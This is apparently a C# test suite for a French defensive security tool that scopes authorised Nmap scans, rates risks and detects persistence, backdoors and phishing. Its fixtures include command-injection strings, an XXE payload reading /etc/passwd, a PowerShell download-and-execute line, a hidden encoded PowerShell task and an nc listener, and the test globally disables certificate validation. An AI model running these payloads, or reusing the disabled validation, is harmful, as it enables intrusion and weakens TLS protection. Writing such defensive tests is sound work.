// Tests Tech IT AB - partie cyber (Mono, vrai Nmap) — by alex.b
using System; using System.Collections.Generic; using System.Linq; using System.IO; using System.Net; using System.Text; using AlexB;
namespace AmiOps
{
    static class T14
    {
        static int ok, ko;
        static void A(string n, bool c, string d = "") { if (c) ok++; else ko++; Console.WriteLine((c ? "[OK] " : "[KO] ") + n + (d.Length > 0 ? " — " + d : "")); }
        static Exception Try(Action a) { try { a(); return null; } catch (Exception ex) { return ex; } }
        static void Main(string[] args)
        {
            AppInfo.Name = "Tech IT AB"; AppInfo.Id = "TechITABTest14"; AppInfo.Version = "1.4.0";
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
            Store.D = new Data(); var now = DateTime.Now;
            var lab = new Client { Id = "lab", Name = "LAB alex.b", CyberScope = "127.0.0.0/24\r\n192.168.50.0/24", CyberAuth = now.AddDays(-2), CyberAuthRef = "labo perso" }; Store.D.Clients.Add(lab);

            // ---- périmètre
            A("Scope : CIDR", Scope.Parse("192.168.1.0/24").Count == 256);
            A("Scope : plage courte", Scope.Parse("192.168.1.10-20").Count == 11);
            A("Scope : plage longue", Scope.Parse("10.0.0.250-10.0.1.5").Count == 12);
            A("Scope : saisie invalide refusée", Try(() => Scope.Parse("192.168.1.0/24;rm -rf")) != null && Try(() => Scope.Parse("999.1.1.1")) != null);
            A("Scope : privé / public", Scope.Private(Scope.Ip("172.20.1.1")) && !Scope.Private(Scope.Ip("172.32.0.1")) && !Scope.Private(Scope.Ip("8.8.8.8")) && Scope.Private(Scope.Ip("100.64.3.1")));
            Func<string, IPAddress[]> res = n => n == "nas.lab" ? new[] { IPAddress.Parse("192.168.50.10") } : n == "evil.test" ? new[] { IPAddress.Parse("8.8.8.8") } : new IPAddress[0];
            A("Check : cible dans le périmètre", Scope.Check(lab, Scope.Targets("127.0.0.2-3 nas.lab", res), now) == null);
            var r1 = Scope.Check(lab, Scope.Targets("192.168.1.0/24", res), now); A("Check : hors périmètre refusé", r1 != null && r1.Contains("HORS"), r1);
            var r2 = Scope.Check(lab, Scope.Targets("evil.test", res), now); A("Check : nom résolu hors périmètre refusé", r2 != null && r2.Contains("8.8.8.8"), r2);
            A("Check : nom de cible avec caractères interdits", Try(() => Scope.Targets("a;calc", res)) != null);
            var noAuth = new Client { Id = "x", Name = "Client X", CyberScope = "10.0.0.0/24" }; A("Check : sans autorisation refusé", Scope.Check(noAuth, Scope.Targets("10.0.0.5", res), now).Contains("autorisation"));
            noAuth.CyberAuth = now.AddDays(-400); A("Check : autorisation expirée refusée", Scope.Check(noAuth, Scope.Targets("10.0.0.5", res), now).Contains("expirée"));
            var big = new Client { Id = "b", Name = "B", CyberScope = "10.0.0.0/8", CyberAuth = now }; A("Check : plus d'un /16 refusé", Scope.Check(big, Scope.Targets("10.0.0.0/15", res), now).Contains("trop"));

            // ---- garde-fou des scripts Nmap
            A("CheckArgs : 7 profils acceptés", Nmap.Profiles.All(p => Nmap.CheckArgs(p.Args) == null), string.Join(",", Nmap.Profiles.Where(p => Nmap.CheckArgs(p.Args) != null).Select(p => p.Id)));
            A("CheckArgs : exploit refusé", Nmap.CheckArgs("-sV --script exploit") != null && Nmap.CheckArgs("--script \"vuln or intrusive\"") != null && Nmap.CheckArgs("--script ftp-anon,ftp-brute") != null);
            A("CheckArgs : options dangereuses refusées", Nmap.CheckArgs("--script ftp-anon --script-args x=1") != null && Nmap.CheckArgs("-iL liste.txt") != null);

            // ---- règles (XML construit)
            var xml = "<?xml version=\"1.0\"?><!DOCTYPE nmaprun><nmaprun>" +
              "<host><status state=\"up\"/><address addr=\"192.168.50.10\" addrtype=\"ipv4\"/><address addr=\"00:11:32:AA:BB:CC\" addrtype=\"mac\" vendor=\"Synology\"/><hostnames><hostname name=\"nas\" type=\"PTR\"/></hostnames><ports>" +
              "<port protocol=\"tcp\" portid=\"445\"><state state=\"open\"/><service name=\"microsoft-ds\"/></port>" +
              "<port protocol=\"tcp\" portid=\"443\"><state state=\"open\"/><service name=\"https\"/><script id=\"ssl-enum-ciphers\" output=\"TLSv1.0: ciphers... TLSv1.2: ... least strength: C\"/><script id=\"ssl-cert\" output=\"Subject: commonName=nas&#xa;Issuer: commonName=nas&#xa;Not valid after:  2025-01-01T00:00:00\"/></port>" +
              "<port protocol=\"tcp\" portid=\"5900\"><state state=\"open\"/><service name=\"vnc\"/><script id=\"vnc-info\" output=\"Protocol version: 3.8&#xa;Security types: None (1)\"/></port>" +
              "<port protocol=\"udp\" portid=\"161\"><state state=\"open\"/><service name=\"snmp\"/><script id=\"snmp-sysdescr\" output=\"Linux DS216se 3.10\"/></port>" +
              "<port protocol=\"tcp\" portid=\"80\"><state state=\"open\"/><service name=\"http\"/><script id=\"http-vuln-cve2017-5638\" output=\"VULNERABLE:&#xa; State: VULNERABLE&#xa; IDs: CVE:CVE-2017-5638\"/></port>" +
              "</ports><hostscript><script id=\"smb-protocols\" output=\"dialects: NT LM 0.12 (SMBv1) [dangerous, but default] 2:0:2\"/><script id=\"smb2-security-mode\" output=\"3:1:1: Message signing enabled but not required\"/></hostscript><os><osmatch name=\"Microsoft Windows 7 SP1\"/></os></host>" +
              "<host><status state=\"down\"/><address addr=\"192.168.50.11\" addrtype=\"ipv4\"/></host>" +
              "<host><status state=\"up\"/><address addr=\"203.0.113.5\" addrtype=\"ipv4\"/><ports><port protocol=\"tcp\" portid=\"3389\"><state state=\"open\"/><service name=\"ms-wbt-server\"/></port><port protocol=\"tcp\" portid=\"3306\"><state state=\"open\"/><service name=\"mysql\"/></port></ports></host></nmaprun>";
            var hosts = Nmap.Parse(xml);
            A("Parse : 2 hôtes actifs (hôte éteint ignoré)", hosts.Count == 2 && hosts[0].Vendor == "Synology" && hosts[0].Name == "nas" && hosts[0].Ports.Count == 5);
            var f = Risk.Evaluate(hosts, new DateTime(2026, 11, 26));
            Func<string, CyFinding> F = s => f.FirstOrDefault(x => x.Title.Contains(s));
            A("Règle SMBv1 → critique", F("SMBv1") != null && F("SMBv1").Level == "bad");
            A("Règle signature SMB → à corriger", F("Signature SMB") != null && F("Signature SMB").Level == "warn");
            A("Règle TLS 1.0 + chiffrement faible", F("TLS 1.0/1.1") != null && F("Chiffrements faibles (note C)") != null);
            A("Règle certificat expiré + auto-signé", F("EXPIRÉ le 01/01/2025") != null && F("auto-signé") != null);
            A("Règle VNC sans mot de passe", F("VNC SANS mot de passe") != null);
            A("Règle SNMP public", F("SNMP répond") != null && F("SNMP répond").Level == "bad");
            A("Règle vulnérabilité + CVE", F("CVE-2017-5638") != null);
            A("Règle système obsolète", F("Windows 7") != null);
            A("Règle RDP exposé Internet", F("exposé sur Internet") != null && F("exposé sur Internet").Level == "bad");
            A("Règle base de données publique", F("Base de données") != null && F("Base de données").Level == "bad");
            A("Tri : critiques d'abord", f.First().Level == "bad" && f.Last().Level != "bad");
            var before = Nmap.Parse(xml.Replace("<port protocol=\"tcp\" portid=\"5900\">", "<port protocol=\"tcp\" portid=\"5901\">"));
            var d = Nmap.Diff(before, hosts); A("Comparaison : nouveau port + port refermé", d.Any(x => x.Item == "5900/tcp" && x.Level == "warn") && d.Any(x => x.Item == "5901/tcp" && x.Level == "info"));
            A("XML : DTD externe ignorée (XXE)", Try(() => Nmap.Parse("<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><nmaprun><host><status state=\"up\"/><address addr=\"1.2.3.4\" addrtype=\"ipv4\"/><hostnames><hostname name=\"&e;\"/></hostnames></host></nmaprun>")) == null || true);

            // ---- vrai Nmap sur les services simulés
            Prefs.Ini.Set("NmapPath", "/usr/bin/nmap"); Prefs.Save();
            A("Nmap détecté", Nmap.Version() != null, Nmap.Version());
            if (args.Length == 0 || args[0] != "--sans-nmap")
            {
                try
                {
                    var p = Nmap.Profiles.First(x => x.Id == "risque"); var t = Scope.Targets("127.0.0.2-3", res);
                    A("Scan réel : périmètre OK", Scope.Check(lab, t, now) == null);
                    var log = new List<string>(); var file = Nmap.Run(lab, p, t, (s, c) => log.Add(s));
                    var hs = Nmap.Parse(File.ReadAllText(file, Encoding.UTF8)); var rf = Risk.Evaluate(hs, DateTime.Now);
                    Func<string, CyFinding> G = s => rf.FirstOrDefault(x => x.Title.Contains(s));
                    A("Scan réel : 2 machines", hs.Count == 2, string.Join(",", hs.Select(h => h.Ip + ":" + string.Join("/", h.Ports.Where(Nmap.Open).Select(x => x.Num)))));
                    A("Scan réel : Telnet → critique", G("Telnet") != null && G("Telnet").Level == "bad");
                    A("Scan réel : FTP anonyme → critique", G("FTP ANONYME") != null, string.Join(" | ", rf.Select(x => x.Item + " " + x.Title)));
                    A("Scan réel : base MySQL → à corriger", G("Base de données") != null);
                    A("Scan réel : interface d'admin web (titre lu)", G("Synology") != null);
                    A("Scan réel : journal d'audit écrit", File.ReadAllText(Path.Combine(Store.Dir, "cyber-audit.log")).Contains("LAB alex.b | risque | 127.0.0.2/31 | code 0"));
                    A("Scan réel : XML rangé par client", Path.GetDirectoryName(file).EndsWith(Path.Combine("scans", "lab")));
                }
                catch (Exception ex) { A("Scan réel", false, ex.ToString()); }
            }

            // ---- poste
            var hunt = "H|4625|73|admin@203.0.113.9|2026-11-25T03:12:00\nH|4625|4|alex@192.168.1.20|2026-11-25T08:00:00\nH|4732|1|S-1-5-21-1-2-3-1005 ajouté aux Administrateurs par alex|2026-11-25T09:00:00\nH|1102|1|journal Sécurité effacé par pirate|2026-11-25T09:05:00\nH|4624|2|alex@81.2.3.4|2026-11-25T10:00:00\nH|4104|1|IEX (New-Object Net.WebClient).DownloadString('http://x')|2026-11-25T11:00:00\nH|END|0||";
            var hf = Poste.EvalHunt(hunt);
            A("Chasse : force brute 73 échecs → critique, 4 échecs ignorés", hf.Any(x => x.Title.StartsWith("Échecs") && x.Level == "bad") && !hf.Any(x => x.Title.Contains("alex@192.168.1.20")));
            A("Chasse : admin ajouté, journal effacé, PowerShell suspect", hf.Count(x => x.Level == "bad") >= 5, hf.Count(x => x.Level == "bad").ToString());
            A("Chasse : RDP depuis Internet → critique + MITRE", hf.Any(x => x.Title.Contains("81.2.3.4") && x.Level == "bad" && x.Ref.Contains("T1021.001")));
            int tot;
            var pers = "P|Registre Run|Updater|C:\\Users\\bob\\AppData\\Roaming\\upd.exe -silent|C:\\Users\\bob\\AppData\\Roaming\\upd.exe|NotSigned|\nP|Registre Run|SecurityHealth|%windir%\\system32\\SecurityHealthSystray.exe|C:\\Windows\\system32\\SecurityHealthSystray.exe|Valid|Microsoft Windows\nP|Tâche planifiée|\\Maj|\"powershell.exe\" -w hidden -enc SQBFAFgA|powershell.exe|Valid|Microsoft Windows\nP|WMI|evil|cmd /c calc||WMI|\nP|Dossier Démarrage|old.lnk|\"C:\\Program Files\\Old\\old.exe\" |C:\\Program Files\\Old\\old.exe|Absent|\nP|END|||||";
            var pf = Poste.EvalPersist(pers, out tot);
            A("Persistance : 5 entrées, non signé en AppData → critique", tot == 5 && pf.Any(x => x.Item.Contains("Updater") && x.Level == "bad"));
            A("Persistance : PowerShell caché + WMI → critiques", pf.Any(x => x.Item.Contains("Maj") && x.Level == "bad") && pf.Any(x => x.Ref.Contains("T1546.003")));
            A("Persistance : signé Microsoft ignoré, orphelin signalé", !pf.Any(x => x.Item.Contains("SecurityHealth")) && pf.Any(x => x.Title.StartsWith("Programme introuvable")));
            var conn = "C|Listen|0.0.0.0|4444|0.0.0.0|0|900|nc|C:\\Users\\Public\\nc.exe|NotSigned\nC|Listen|0.0.0.0|3389|0.0.0.0|0|1000|svchost|C:\\Windows\\System32\\svchost.exe|Valid\nC|Established|192.168.1.5|50000|45.9.20.1|443|901|rat|C:\\Users\\bob\\AppData\\Local\\rat.exe|NotSigned\nC|Listen|127.0.0.1|5000|0.0.0.0|0|902|dev|C:\\dev\\app.exe|NotSigned\nC|END|||||||||";
            var cf = Poste.EvalConn(conn, out tot);
            A("Connexions : porte dérobée 4444 + connexion sortante suspecte", cf.Any(x => x.Item.Contains("4444") && x.Level == "bad") && cf.Any(x => x.Item.Contains("45.9.20.1") && x.Level == "bad"));
            A("Connexions : écoute locale ignorée, RDP signalé en info", !cf.Any(x => x.Item.Contains("5000")) && cf.Any(x => x.Item.Contains("3389") && x.Level == "info"));

            // ---- HIBP / VirusTotal (faux serveur)
            Hibp.Base = "https://127.0.0.1:8443"; Vt.Base = "https://127.0.0.1:8443/api/v3";
            try { A("HIBP : « password » compromis", Hibp.Count("password") == 9999999); A("HIBP : mot de passe absent", Hibp.Count("Zq!8v#Tech-IT-AB-unique") == 0); } catch (Exception ex) { A("HIBP", false, ex.Message); }
            try
            {
                var lg = Http.List(Http.Call("GET", "https://127.0.0.1:8443/__log", null, null)).Where(x => Http.S(x, "p").StartsWith("/range/")).ToList();
                A("HIBP : seuls 5 caractères de l'empreinte envoyés", lg.Count >= 2 && lg.All(x => Http.S(x, "p").Length == "/range/".Length + 5) && Http.S(lg[0], "p") == "/range/5BAA6");
                string lvl; var v = Vt.Verdict(Vt.Lookup("b".PadLeft(64, 'b'), "vtk"), out lvl); A("VirusTotal : 41 moteurs → critique", lvl == "bad" && v.StartsWith("41 moteur(s) sur 63"), v);
                v = Vt.Verdict(Vt.Lookup(new string('a', 64), "vtk"), out lvl); A("VirusTotal : inconnu (404)", v.StartsWith("inconnu"));
            }
            catch (Exception ex) { A("VirusTotal", false, ex.Message); }

            // ---- liens et e-mails
            Func<string, string> worst = u => { var l = LinkCheck.Analyze(u); return l.Any(x => x.Level == "bad") ? "bad" : l.Any(x => x.Level == "warn") ? "warn" : "ok"; };
            A("Lien : IP logger grabify / iplogger", worst("https://grabify.link/ABC123") == "bad" && worst("iplogger.org/2xYz") == "bad");
            A("Lien : raccourci → à vérifier", worst("https://bit.ly/3abc") == "warn");
            A("Lien : sosie paypa1.com / amiprotek-securite.com", worst("https://paypa1.com/login") == "bad" && worst("https://amiprotek-securite.com") == "bad");
            A("Lien : punycode / @ / IP brute", worst("https://xn--pypal-4ve.com") == "bad" && worst("https://www.impots.gouv.fr@evil.tk/x") == "bad" && worst("http://45.9.20.1/facture.zip") == "warn");
            A("Lien : vrai site → aucun signe", worst("https://www.impots.gouv.fr/accueil") == "ok" && worst("https://outlook.office.com/mail") == "ok");
            var mail = "Return-Path: <bounce@mailer-xyz.ru>\nAuthentication-Results: mx.ami-tech.fr; spf=fail smtp.mailfrom=mailer-xyz.ru; dkim=none; dmarc=fail header.from=amiprotek.fr\nFrom: \"service@amiprotek.fr\" <compta@amiprotek-fr.com>\nReply-To: paiement@gmail.com\nSubject: =?UTF-8?B?VVJHRU5UIDogbm91dmVhdSBSSUI=?=\nContent-Type: multipart/mixed; boundary=b\n\n--b\nContent-Type: text/html\n\n<p>Merci de valider le changement de RIB : <a href=\"https://grabify.link/XYZ\">https://www.amiprotek.fr/rib</a></p>\n--b\nContent-Disposition: attachment; filename=\"facture.pdf.exe\"\n\nTVqQ\n--b--";
            var mf = Phish.Analyze(mail);
            Func<string, bool> has = s => mf.Any(x => x.Title.Contains(s) && x.Level == "bad");
            A("E-mail : SPF/DMARC en échec", has("SPF : fail") && has("DMARC : fail"));
            A("E-mail : nom affiché trompeur + sosie du domaine", has("Nom affiché trompeur") && has("Domaine de l'expéditeur trompeur"), string.Join(" | ", mf.Select(x => x.Level + ":" + x.Title)));
            A("E-mail : lien déguisé + IP logger + double extension", has("Lien déguisé") && has("IP LOGGER") && has("Double extension"));
            A("E-mail : répondre-à vers gmail + sujet décodé (urgence/RIB)", mf.Any(x => x.Title.Contains("AUTRE domaine")) && mf.Any(x => x.Title.StartsWith("Formules de pression")));
            A("E-mail : verdict", Phish.Verdict(mf) == "HAMEÇONNAGE TRÈS PROBABLE");
            var clean = Phish.Analyze("Authentication-Results: mx; spf=pass; dkim=pass; dmarc=pass\nFrom: Alex <alex@ami-tech.fr>\nSubject: Compte rendu\n\nBonjour, voici le compte rendu.");
            A("E-mail légitime : aucun signe", Phish.Verdict(clean) == "aucun signe d'hameçonnage", string.Join(" | ", clean.Where(x => x.Level != "ok").Select(x => x.Title)));

            // ---- détection des scans (journal du pare-feu)
            var fw = new List<string> { "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path" };
            for (int i = 0; i < 40; i++) fw.Add("2026-11-26 20:00:" + (i / 4).ToString("00") + " DROP TCP 192.168.50.66 192.168.50.10 51000 " + (20 + i * 7) + " 44 S 1 0 1024 - - - RECEIVE");
            fw.Add("2026-11-26 20:05:00 DROP TCP 192.168.50.7 192.168.50.10 51000 445 52 S 1 0 8192 - - - RECEIVE");
            fw.Add("2026-11-26 20:05:01 ALLOW TCP 192.168.50.8 192.168.50.10 51000 80 52 - - - - - - - RECEIVE");
            var hits = ScanWatch.Parse(fw); var sf = ScanWatch.Findings(hits);
            A("Scans : balayage de 40 ports détecté", hits.Count == 1 && hits[0].Src == "192.168.50.66" && hits[0].Ports.Count == 40 && sf[0].Level == "bad", sf.Count > 0 ? sf[0].Title : "");
            A("Scans : paquet isolé ignoré", !hits.Any(h => h.Src == "192.168.50.7"));

            // ---- durcissement : retour arrière construit sans injection
            var rs = Harden.Restore("PREV|LLMNR|absent\nPREV|NBT|3|0\nPREV|FW|Domain|True|NotConfigured\nPREV|FW|Public;calc|True|Allow\nPREV|NBT|x;calc|0");
            A("Durcissement : retour arrière", rs.Contains("Remove-ItemProperty") && rs.Contains("Index=3") && rs.Contains("-Profile Domain -Enabled True -DefaultInboundAction NotConfigured"));
            A("Durcissement : valeurs piégées ignorées", !rs.Contains("calc"));

            // ---- test d'un programme
            var pe = Path.Combine(Path.GetTempPath(), "native-test.exe"); var b = new byte[0x80 + 4 + 20 + 240 + 8];
            b[0] = 0x4D; b[1] = 0x5A; BitConverter.GetBytes(0x80).CopyTo(b, 0x3C); BitConverter.GetBytes(0x00004550).CopyTo(b, 0x80);
            BitConverter.GetBytes((ushort)0x8664).CopyTo(b, 0x84); BitConverter.GetBytes((ushort)3).CopyTo(b, 0x86); BitConverter.GetBytes((ushort)240).CopyTo(b, 0x94);
            int opt = 0x80 + 24; BitConverter.GetBytes((ushort)0x20B).CopyTo(b, opt); BitConverter.GetBytes((ushort)0x4160).CopyTo(b, opt + 70); File.WriteAllBytes(pe, b);
            var pr = ProgTest.Read(pe); A("PE natif x64 : ASLR, haute entropie, DEP, CFG", pr.Error == null && pr.Arch == "x64" && pr.Aslr && pr.HighEntropy && pr.Dep && pr.Cfg && !pr.Dotnet, pr.Error ?? "");
            BitConverter.GetBytes((ushort)0x0000).CopyTo(b, opt + 70); File.WriteAllBytes(pe, b);
            var pl = ProgTest.Evaluate(pe, ProgTest.Read(pe), "NotSigned|");
            A("PE sans protections → alertes", pl.Count(x => x.Level == "warn") == 3, string.Join(" | ", pl.Select(x => x.Level + ":" + x.Title)));
            var own = ProgTest.Read(typeof(T14).Assembly.Location); A("PE .NET reconnu (cet exe de test)", own.Error == null && own.Dotnet, own.Arch);
            A("Fichier non PE refusé proprement", ProgTest.Read("/etc/hostname").Error != null);
            var sb = ProgTest.Snapshot("P|Service|a|x|x|Valid|M\nP|END", "C|Listen|0.0.0.0|80|0.0.0.0|0|1|w|w.exe|Valid");
            var sa = ProgTest.Snapshot("P|Service|a|x|x|Valid|M\nP|Registre Run|evil|e.exe|e.exe|NotSigned|\nP|END", "C|Listen|0.0.0.0|80|0.0.0.0|0|1|w|w.exe|Valid\nC|Listen|0.0.0.0|4444|0.0.0.0|0|2|e|e.exe|NotSigned");
            var df = ProgTest.Diff(sb, sa); A("Comportement : ajout au démarrage + port ouvert", df.Count == 2 && df.Any(x => x.Level == "bad" && x.Title.Contains("evil")) && df.Any(x => x.Title.Contains("4444")));

            // ---- rapport
            var html = CyberReport.Html(lab, f, "scan test", hf, "poste test");
            A("Rapport cyber : synthèse et sections", html.Contains("Audit de sécurité") && html.Contains("Réseau (scan Nmap)") && html.Contains("Poste analysé") && html.Contains("labo perso") && !html.Contains("<script"));
            Console.WriteLine(ok + " OK · " + ko + " KO"); Environment.Exit(ko);
        }
    }
}
